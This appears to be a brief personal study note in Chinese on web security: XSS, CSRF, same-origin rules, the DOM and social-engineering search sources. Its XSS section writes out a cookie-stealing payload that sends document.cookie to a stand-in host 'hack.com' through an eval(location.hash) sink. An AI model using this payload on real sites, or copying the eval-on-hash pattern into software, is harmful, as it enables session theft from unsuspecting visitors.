2019.05.23
# XSS（盗取）
如果百度上有个链接地址是
http://www.baidu.com/#new%20Image().src="http://hack.com?cookie="+escape(document.cookie)
同时页面会执行了如下script脚本
eval(location.hash.substr(1));
//location.hash 获取#和后面的东西
那么谁访问后都会把cookie泄露
# CSRF（借用）
# 域名相同才算【同域】，不然都是跨域，顶级域名相同并没卵用
# DOM document object model
# 社工
Google Hack、SNS垂直搜索、数据库
# 
